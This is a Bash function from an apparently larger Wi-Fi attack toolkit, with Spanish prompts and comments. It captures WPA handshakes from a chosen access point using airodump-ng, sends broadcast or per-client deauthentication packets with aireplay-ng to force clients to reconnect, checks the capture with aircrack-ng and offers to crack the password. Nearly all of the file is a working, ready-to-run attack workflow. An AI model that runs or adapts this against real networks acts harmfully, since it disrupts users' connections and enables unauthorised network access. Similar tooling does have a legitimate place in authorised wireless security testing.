#!/bin/bash

function capture_handshake() {
    banner
    ensure_mon_interface
    
    # Flag global para el trap de limpieza
    export HANDSHAKE_CAPTURED=0
    export full_cap_path=""
    
    # Variables locales
    local bssid=""
    local channel=""
    local default_name=""
    local filename=""
    
    # Escaneo modular
    start_scan_and_selection "airodump"
    if [ $? -eq 0 ]; then
        bssid="$TARGET_BSSID"
        channel="$TARGET_CHANNEL"
        default_name=$(echo "$TARGET_ESSID" | sed 's/ /_/g')
        read -p "Nombre para el archivo de captura (Enter para '$default_name'): " filename
        if [ -z "$filename" ]; then filename="$default_name"; fi
    else
        echo -e "${YELLOW}[!] Pasando a modo manual...${NC}"
        
        # Validar BSSID
        while true; do
            read -p "Ingresa el BSSID del objetivo (XX:XX:XX:XX:XX:XX): " bssid
            if [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                break
            else
                echo -e "${RED}[!] BSSID inválido. Formato: XX:XX:XX:XX:XX:XX${NC}"
            fi
        done
        
        # Validar Canal
        while true; do
            read -p "Ingresa el CANAL del objetivo (1-14): " channel
            if [[ "$channel" =~ ^[0-9]+$ ]] && [ "$channel" -ge 1 ] && [ "$channel" -le 14 ]; then
                break
            else
                echo -e "${RED}[!] Canal inválido. Debe ser un número entre 1 y 14${NC}"
            fi
        done
        
        # Nombre de archivo
        read -p "Ingresa un nombre para el archivo de captura: " filename
        if [ -z "$filename" ]; then 
            filename="handshake_$(date +%s)"
        fi
        default_name="$filename"
    fi
    
    full_cap_path="$WORK_DIR/$filename"
    
    # Limpiar archivos previos con el mismo nombre para asegurar que airodump empiece en -01
    rm -f "${full_cap_path}"*
    
    echo -e "${YELLOW}[*] Iniciando captura en canal $channel...${NC}"
    echo -e "${CYAN}[*] Target: $bssid (Canal $channel)${NC}"
    
    airodump_cmd="airodump-ng -c $channel --bssid $bssid -w $full_cap_path $mon_interface"
    run_in_new_terminal "$airodump_cmd" "Capturando Handshake - $bssid" "$bssid" "$full_cap_path"

    
    echo -e "${YELLOW}[*] Esperando 5 segundos para que inicie la captura...${NC}"
    sleep 5
    
    
    while true; do
        clear
        banner
        echo ""
        echo -e "${YELLOW}  CAPTURA DE HANDSHAKE${NC}"
        echo -e "  Target: ${GREEN}$default_name${NC} (${CYAN}$bssid${NC})"
        echo ""
        
        # PRIMERO: Verificar si el proceso de captura sigue activo
        if ! pgrep -f "airodump-ng.*$bssid" > /dev/null; then
            echo -e "  ${CYAN}●${NC} Estado de Captura:"
            echo -e "    ${RED}✗ Inactiva${NC} - La captura se detuvo"
            echo ""
            echo -e "${YELLOW}[!] La captura se detuvo.${NC}"
            echo -e "${YELLOW}[*] Verificando si se capturó el handshake...${NC}"
            
            # Buscar archivo de captura
            cap_to_check=""
            if [ -f "${full_cap_path}-01.cap" ]; then
                cap_to_check="${full_cap_path}-01.cap"
            elif [ -f "${full_cap_path}.cap" ]; then
                cap_to_check="${full_cap_path}.cap"
            fi
            
            # Verificar handshake si existe el archivo
            if [ ! -z "$cap_to_check" ] && [ -s "$cap_to_check" ]; then
                if timeout 10 aircrack-ng -b "$bssid" "$cap_to_check" 2>&1 | grep -q "1 handshake"; then
                    echo -e "${GREEN}[!!!] HANDSHAKE CAPTURADO EXITOSAMENTE${NC}"
                    export HANDSHAKE_CAPTURED=1
                    
                    # Renombrar archivo final al nombre deseado (sin -01) para guardarlo limpio
                    if [[ "$cap_to_check" != "${full_cap_path}.cap" ]]; then
                        mv "$cap_to_check" "${full_cap_path}.cap"
                        cap_to_check="${full_cap_path}.cap"
                    fi
                    
                    echo -e "${GREEN}[+] Archivo guardado en: $cap_to_check${NC}"
                    echo ""
                    read -p "¿Crackear ahora? (s/n): " crack_now
                    if [[ "$crack_now" == "s" || "$crack_now" == "S" ]]; then
                        crack_password_auto "$cap_to_check" "$bssid"
                    fi
                    break
                else
                    echo -e "${RED}[!] No se detectó handshake en el archivo de captura.${NC}"
                    echo -e "${YELLOW}[*] Eliminando archivos incompletos...${NC}"
                    rm -f "${full_cap_path}"*
                    read -p "Presiona Enter para volver al menú principal..."
                    return
                fi
            else
                echo -e "${RED}[!] No se encontró archivo de captura válido.${NC}"
                read -p "Presiona Enter para volver al menú principal..."
                return
            fi
        fi
        
        # SEGUNDO: Mostrar estado e indicadores
        echo -e "  ${CYAN}●${NC} Estado de Captura:"
        echo -e "    ${GREEN}✓ Activa${NC} - Monitoreando tráfico..."
        echo ""
        echo -e "  ${CYAN}ℹ${NC}  La ventana de captura se cierra automáticamente"
        echo -e "     al detectar el handshake. Si no se captura,"
        echo -e "     ejecuta un ataque de deauth."
        echo ""
        echo -e "  ${CYAN}1${NC}  Deauth masiva (Broadcast)"
        echo -e "  ${CYAN}2${NC}  Deauth específica (Seleccionar cliente)"
        echo -e "  ${CYAN}3${NC}  Volver al menú principal"
        echo ""
        read -p "  → Opción: " hs_opt
        
        case $hs_opt in
            1)
                echo -e "${RED}[ATTACK] Enviando 10 paquetes de deauth (Broadcast)...${NC}"
                aireplay-ng -0 10 -a "$bssid" "$mon_interface"
                sleep 2
                ;;
            2)
                # Parsear clientes desde el CSV que está generando airodump en segundo plano
                csv_file="${full_cap_path}-01.csv"
                if [ ! -f "$csv_file" ]; then
                    echo -e "${RED}[!] Aún no hay datos de clientes. Espera un momento.${NC}"
                else
                    echo -e "\n${YELLOW}--- Clientes Detectados ---${NC}"
                    local count=0
                    local -a client_macs
                    
                    # Leer CSV ignorando la primera sección (APs) y buscando la sección Station MAC
                    in_stations=0
                    while IFS=',' read -r col1 col2 col3 col4 col5 col6 rest; do
                        col1=$(echo "$col1" | tr -d '[:space:]')
                        if [[ "$col1" == "StationMAC" ]]; then in_stations=1; continue; fi
                        
                        if [[ "$in_stations" == "1" && "$col1" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                             # Ignorar si el cliente es el propio BSSID (a veces pasa en modo monitor)
                             if [[ "$col1" != "$bssid" ]]; then
                                 count=$((count+1))
                                 client_macs[$count]="$col1"
                                 power=$(echo "$col4" | tr -d '[:space:]')
                                 packets=$(echo "$col6" | tr -d '[:space:]')
                                 echo -e "$count) MAC: ${GREEN}$col1${NC} | Pwr: $power | Pkts: $packets"
                             fi
                        fi
                    done < "$csv_file"
                    
                    if [ "$count" -eq 0 ]; then
                        echo -e "${RED}[!] No se han detectado clientes activos aún.${NC}"
                    else
                        echo ""
                        read -p "Cliente a atacar (número): " c_sel
                        # Validar que sea un número
                        if [[ "$c_sel" =~ ^[0-9]+$ ]] && [[ "$c_sel" -gt 0 ]] && [[ "$c_sel" -le "$count" ]]; then
                            target_client="${client_macs[$c_sel]}"
                            echo -e "${RED}[ATTACK] Enviando 10 paquetes a $target_client...${NC}"
                            aireplay-ng -0 10 -a "$bssid" -c "$target_client" "$mon_interface"
                        else
                            echo -e "${RED}[!] Selección inválida. Debe ser un número entre 1 y $count${NC}"
                        fi
                    fi
                fi
                read -p "Presiona Enter para continuar..."
                ;;
            3)
                # Verificar si hay handshake antes de eliminar
                cap_to_check=""
                if [ -f "${full_cap_path}-01.cap" ]; then
                    cap_to_check="${full_cap_path}-01.cap"
                elif [ -f "${full_cap_path}.cap" ]; then
                    cap_to_check="${full_cap_path}.cap"
                fi
                
                # Matar proceso de captura
                pkill -f "airodump-ng.*$bssid"
                
                # Verificar si hay handshake válido
                if [ ! -z "$cap_to_check" ] && [ -s "$cap_to_check" ]; then
                    if timeout 10 aircrack-ng -b "$bssid" "$cap_to_check" 2>&1 | grep -q "1 handshake"; then
                        echo ""
                        echo -e "${GREEN}[!!!] Se detectó un handshake válido en el archivo${NC}"
                        read -p "¿Deseas guardar el archivo? (s/n): " save_file
                        if [[ "$save_file" == "s" || "$save_file" == "S" ]]; then
                            # Renombrar archivo final
                            if [[ "$cap_to_check" != "${full_cap_path}.cap" ]]; then
                                mv "$cap_to_check" "${full_cap_path}.cap"
                                cap_to_check="${full_cap_path}.cap"
                            fi
                            echo -e "${GREEN}[+] Archivo guardado en: $cap_to_check${NC}"
                            export HANDSHAKE_CAPTURED=1
                            
                            # Limpiar solo archivos auxiliares (csv, netxml, kismet)
                            rm -f "${full_cap_path}"-*.csv "${full_cap_path}"-*.kismet.csv "${full_cap_path}"-*.kismet.netxml "${full_cap_path}"-*.log.csv
                        else
                            echo -e "${YELLOW}[*] Eliminando todos los archivos de captura...${NC}"
                            rm -f "${full_cap_path}"*
                        fi
                    else
                        echo -e "${YELLOW}[*] No se detectó handshake. Eliminando archivos incompletos...${NC}"
                        rm -f "${full_cap_path}"*
                    fi
                else
                    echo -e "${YELLOW}[*] Eliminando archivos de captura...${NC}"
                    rm -f "${full_cap_path}"*
                fi
                return
                ;;
            *) echo "Opción inválida." ;;
        esac
    done
}
